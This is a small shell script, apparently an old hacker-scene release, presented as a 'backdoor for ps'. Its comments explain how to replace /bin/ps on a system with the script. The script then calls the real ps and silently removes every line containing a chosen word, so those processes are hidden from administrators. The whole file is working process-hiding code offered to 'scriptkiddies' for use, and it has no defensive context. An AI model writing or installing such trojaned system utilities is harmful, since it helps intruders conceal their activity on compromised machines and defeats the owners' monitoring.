#
# lame tiny easy to use backdoor for ps
#
# the word placed after filterword= will be filtered out of the output of ps
#
# usage:
# # mv /bin/ps /bin/.ps
# # cp ~/psbackdoor.sh /bin/ps
# # chmod a+x /bin/ps
#
# Thats it, have phun scriptkiddies
# The Itch / Bse / g0tr00t
# http://bse.die.ms
# http://www.g0tr00t.net

filterword="su"

originalps=/bin/.ps
tempfile=/tmp/.pstmp
grep=/bin/grep
numlines=0

touch $tempfile

if [ ! -x $originalps ]; then
	echo "Error: original ps not found!";
	exit 1
fi

if [ ! -w $tempfile ]; then
	echo "Error: tempfile handling failed!";
	exit 1
fi

$originalps $1 $2 $3 $4| $grep -v $filterword > $tempfile
numlines=`cat $tempfile|wc -l`
numlines=`expr $numlines - 2`
head -n $numlines $tempfile
rm -rf $tempfile

